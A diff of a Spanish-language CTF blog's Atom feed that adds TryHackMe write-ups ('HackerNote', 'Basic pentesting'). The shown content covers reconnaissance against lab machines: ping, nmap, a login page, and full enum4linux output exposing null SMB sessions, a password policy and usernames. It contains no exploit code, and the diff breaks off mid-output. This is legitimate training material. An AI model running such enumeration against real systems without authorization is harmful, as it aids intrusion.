@@ -1,4 +1,56 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-14T15:54:46-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: Basic pentesting</title><link href="http://localhost:4000/basicPentesting/" rel="alternate" type="text/html" title="tryhackme: Basic pentesting" /><published>2021-12-03T00:00:00-05:00</published><updated>2021-12-03T00:00:00-05:00</updated><id>http://localhost:4000/basicPentesting</id><content type="html" xml:base="http://localhost:4000/basicPentesting/">&lt;p&gt;Comprovamos que la maquina este iniciada correctamente enviandole un ping&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-01T09:10:55-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pentester - Ctf’s</title><subtitle>Ingeniero de sistemas, autodidacta, entusidasta por la seguridad informatica.</subtitle><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><entry><title type="html">tryhackme: HackerNote</title><link href="http://localhost:4000/hacker-note/" rel="alternate" type="text/html" title="tryhackme: HackerNote" /><published>2021-12-22T00:00:00-05:00</published><updated>2021-12-22T00:00:00-05:00</updated><id>http://localhost:4000/hacker-note</id><content type="html" xml:base="http://localhost:4000/hacker-note/">&lt;h1 id=&quot;1-escaneo-de-puertos&quot;&gt;1. Escaneo de puertos&lt;/h1&gt;
+
+&lt;p&gt;Lo primero que haremos ser un &lt;em&gt;ping -c 1&lt;/em&gt; al &lt;em&gt;ip&lt;/em&gt; y ver si nuestra maquina ya esta activa&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.94.166
+PING 10.10.94.166 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.94.166&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.94.166: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;536 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.94.166 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 535.998/535.998/535.998/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;usamos &lt;em&gt;wichSystem.py&lt;/em&gt; (utilidad desarrollada por @s4vitar) para ver con que clase de maquina estamos trabajando&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wichSystem.py 10.10.94.166
+
+10.10.94.166 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ttl -&amp;gt; 63&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Ahora realizamos un primer escaneo de puertos usando la &lt;em&gt;nmap&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/allPorts.png&quot; alt=&quot;allPorts&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;vemos los puertos un poco “mejor” con la utilidad &lt;em&gt;extractPorts&lt;/em&gt;, y copiamos los puertos en la clipboard para ejecutar otro analisis&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/extractPorts.png&quot; alt=&quot;extractPorts&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Mientras temina el analisis vamos ganando tiempo, verificando otro posible vector de ataque&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/targeted.png&quot; alt=&quot;targeted&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vemos que existe el puerto &lt;em&gt;80&lt;/em&gt; esta corriento, lo cual significa que existe una pagina web, la vemos&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/server.png&quot; alt=&quot;server&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;No vemos nada relevante al momento, verificamos el &lt;em&gt;login&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;iniciamos sesion con las credenciales del nuestro usuario y vemos que podemos crear una nota&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/hackerNote/notes.png&quot; alt=&quot;notes&quot; /&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="web" /><category term="exploit" /><category term="escalate" /><summary type="html">Una aplicación web personalizada que presenta la enumeración de nombres de usuario, listas de palabras personalizadas y un exploit básico de escalada de privilegios.</summary></entry><entry><title type="html">tryhackme: Basic pentesting</title><link href="http://localhost:4000/basicPentesting/" rel="alternate" type="text/html" title="tryhackme: Basic pentesting" /><published>2021-12-03T00:00:00-05:00</published><updated>2021-12-03T00:00:00-05:00</updated><id>http://localhost:4000/basicPentesting</id><content type="html" xml:base="http://localhost:4000/basicPentesting/">&lt;p&gt;Comprovamos que la maquina este iniciada correctamente enviandole un ping&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.110.104
 PING 10.10.110.104 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.110.104&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
@@ -127,7 +179,202 @@ la guardaremos&lt;/li&gt;
   &lt;li&gt;ya sabemos que la contraseña es debil, por tanto, usaremos un diccionario que trae parrot&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/basic/j.png&quot; alt=&quot;j&quot; /&gt;&lt;/p&gt;</content><author><name>Deiby Espinosa</name><email>deibysp39@gmail.com</email></author><category term="tryhackme" /><category term="brute forcing" /><category term="hash cracking" /><category term="service enumeration" /><category term="Linux Enumeration" /><summary type="html">Esta es una máquina que le permite practicar la piratería de aplicaciones web y la escalada de privilegios.</summary></entry><entry><title type="html">tryhackme: attacktive directory</title><link href="http://localhost:4000/attacktive-directory/" rel="alternate" type="text/html" title="tryhackme: attacktive directory" /><published>2021-11-30T00:00:00-05:00</published><updated>2021-11-30T00:00:00-05:00</updated><id>http://localhost:4000/attacktive-directory</id><content type="html" xml:base="http://localhost:4000/attacktive-directory/">&lt;h2 id=&quot;comprovamos-que-la-maquina-este-iniciada-correctamente-enviandole-un-ping&quot;&gt;Comprovamos que la maquina este iniciada correctamente enviandole un &lt;em&gt;ping&lt;/em&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/basic/j.png&quot; alt=&quot;j&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buscamos algo mas de información usando &lt;em&gt;enum4linux&lt;/em&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enum4linux 10.10.131.72
+Starting enum4linux v0.8.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on Sun Dec 12 13:31:33 2021
+
+ &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
+|    Target Information    |
+ &lt;span class=&quot;o&quot;&gt;==========================&lt;/span&gt; 
+Target ........... 10.10.131.72
+RID Range ........ 500-550,1000-1050
+Username ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+Password ......... &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ &lt;span class=&quot;o&quot;&gt;====================================================&lt;/span&gt; 
+|    Enumerating Workgroup/Domain on 10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;====================================================&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got domain/workgroup name: WORKGROUP
+
+ &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt; 
+|    Nbtstat Information &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;============================================&lt;/span&gt; 
+Looking up status of 10.10.131.72
+        BASIC2          &amp;lt;00&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Workstation Service
+        BASIC2          &amp;lt;03&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Messenger Service
+        BASIC2          &amp;lt;20&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  File Server Service
+        ..__MSBROWSE__. &amp;lt;01&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Master Browser
+        WORKGROUP       &amp;lt;00&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain/Workgroup Name
+        WORKGROUP       &amp;lt;1d&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Master Browser
+        WORKGROUP       &amp;lt;1e&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Browser Service Elections
+
+        MAC Address &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 00-00-00-00-00-00
+
+ &lt;span class=&quot;o&quot;&gt;=====================================&lt;/span&gt; 
+|    Session Check on 10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;=====================================&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Server 10.10.131.72 allows sessions using username &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+
+ &lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; 
+|    Getting domain SID &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; 
+Domain Name: WORKGROUP
+Domain Sid: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NULL SID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Can&lt;span class=&quot;s1&quot;&gt;'t determine if host is part of domain or part of a workgroup
+
+ ====================================== 
+|    OS information on 10.10.131.72    |
+ ====================================== 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.131.72 from smbclient: 
+[+] Got OS info for 10.10.131.72 from srvinfo:
+        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+ ============================= 
+|    Users on 10.10.131.72    |
+ ============================= 
+Use of uninitialized value $users in print at ./enum4linux.pl line 874.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
+
+Use of uninitialized value $users in print at ./enum4linux.pl line 888.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
+
+ ========================================= 
+|    Share Enumeration on 10.10.131.72    |
+ ========================================= 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        Anonymous       Disk      
+        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.10.131.72
+//10.10.131.72/Anonymous        Mapping: OK, Listing: OK
+//10.10.131.72/IPC$     [E] Can'&lt;/span&gt;t understand response:
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
+
+ &lt;span class=&quot;o&quot;&gt;====================================================&lt;/span&gt; 
+|    Password Policy Information &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;====================================================&lt;/span&gt; 
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Attaching to 10.10.131.72 using a NULL share
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying protocol 139/SMB...
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Found domain&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] BASIC2
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Builtin
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password Info &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Domain: BASIC2
+
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Minimum password length: 5
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password &lt;span class=&quot;nb&quot;&gt;history &lt;/span&gt;length: None
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Maximum password age: 37 days 6 hours 21 minutes 
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Password Complexity Flags: 000000
+
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Refuse Password Change: 0
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Password Store Cleartext: 0
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Password Lockout Admins: 0
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Password No Clear Change: 0
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Password No Anon Change: 0
+                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain Password Complex: 0
+
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Minimum password age: None
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Reset Account Lockout Counter: 30 minutes 
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Locked Account Duration: 30 minutes 
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Account Lockout Threshold: None
+        &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 5
+
+
+ &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; 
+|    Groups on 10.10.131.72    |
+ &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; 
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting &lt;span class=&quot;nb&quot;&gt;builtin groups&lt;/span&gt;:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting &lt;span class=&quot;nb&quot;&gt;builtin &lt;/span&gt;group memberships:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting &lt;span class=&quot;nb&quot;&gt;local groups&lt;/span&gt;:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;group memberships:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting domain &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting domain group memberships:
+
+ &lt;span class=&quot;o&quot;&gt;=======================================================================&lt;/span&gt; 
+|    Users on 10.10.131.72 via RID cycling &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RIDS: 500-550,1000-1050&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    |
+ &lt;span class=&quot;o&quot;&gt;=======================================================================&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I] Found new SID: S-1-22-1
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;I] Found new SID: S-1-5-32
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;using SID S-1-5-32 and logon username &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+S-1-5-32-500 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-539 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-540 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-542 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-543 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-544 BUILTIN&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrators &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-545 BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-546 BUILTIN&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;uests &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-547 BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;ower Users &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-548 BUILTIN&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;ccount Operators &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-549 BUILTIN&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;erver Operators &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-550 BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rint Operators &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-1037 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-1038 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-32-1039 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;using SID S-1-22-1 and logon username &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+S-1-22-1-1000 Unix User&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ay &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-22-1-1001 Unix User&lt;span class=&quot;se&quot;&gt;\j&lt;/span&gt;an &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, password &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-500 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;obody &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local User&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-502 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-503 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-510 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-511 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-512 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;one &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain Group&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-514 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-515 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-516 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+S-1-5-21-2853212168-2008227510-3551253869-517 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;unknown&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
